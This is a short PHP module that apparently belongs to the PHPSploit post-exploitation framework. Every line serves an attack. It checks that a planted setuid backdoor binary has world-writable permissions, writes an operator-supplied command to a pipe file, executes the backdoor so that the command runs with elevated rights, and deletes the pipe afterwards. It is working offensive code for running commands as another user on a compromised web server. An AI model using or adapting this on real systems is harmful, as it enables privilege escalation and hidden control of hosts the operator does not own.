<?

!import(execute)
!import(getPerms)

// check permissions for backdoor file
if (getPerms($PHPSPLOIT['BACKDOOR']) != '-rwsrwxrwx')
    return error("%s: Invalid backdoor: Bad file name or permissions",
                 $PHPSPLOIT['BACKDOOR']);

// try to open pipe file for writting
if (($file = @fopen($PHPSPLOIT['PIPE'], 'w')) === False)
    return error("%s: Could not write to backdoor pipe file",
                 $PHPSPLOIT['PIPE']);

// write command to the pipe file
fwrite($file, $PHPSPLOIT['COMMAND']);
fclose($file);
chmod($PHPSPLOIT['PIPE'], 0777);

// execute the backdoor (which himself executes pipe file's contents
$result = @execute($PHPSPLOIT['BACKDOOR']);
unlink($PHPSPLOIT['PIPE']);
return $result;

?>
